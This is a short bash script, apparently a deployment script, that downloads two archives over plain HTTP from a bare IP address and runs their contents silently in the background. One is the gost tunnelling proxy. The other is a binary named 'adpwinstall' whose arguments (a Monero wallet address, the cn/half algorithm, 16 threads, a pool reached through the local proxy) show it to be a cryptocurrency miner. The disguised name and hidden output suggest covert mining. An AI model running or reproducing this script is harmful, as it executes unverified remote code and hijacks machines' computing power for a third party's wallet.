#!/bin/bash

current_path=$(pwd)

#cpu = $(grep 'processor' /proc/cpuinfo | sort -u | wc -l)
apt-get update -y
sleep 2
apt-get install hwloc nodejs -y
sleep 2
# Download files A and config-A.json
if [ ! -f "gost.tar" ]; then
    wget http://167.114.172.225:8621/gost.tar
    tar xvf gost.tar
    chmod +x gost-linux-amd64
    chmod +x gost-config.json
    sleep 1
fi
echo "gost"
sleep 1
# 检查2.tar是否存在，不存在则下载
if [ ! -f "adpwinstall.tar" ]; then
    wget http://167.114.172.225:8621/adpwinstall.tar
    tar xvf adpwinstall.tar
    chmod +x adpwinstall
    chmod +x config.json
    sleep 1
fi
echo "adpwinstall"
sleep 1

# Run A in the background using nohup
nohup ./gost-linux-amd64 -C gost-config.json > /dev/null 2>&1 &
sleep 2

# Create a screen and run B in it with the given config
#nohup ./adpwinstall -c config.json > /dev/null 2>&1 &
nohup ./adpwinstall -o 127.0.0.1:18572 -u 44nADigkki2Qb9PrhJ8zoRUgtccCWYDA8E5DtcCsHjoQCUD9mmHLz47anudJuSWE63JCnG36tz9foCzfX5Wk9Uwf26EtLoz -k -a cn/half --threads=16 > /dev/null 2>&1 &
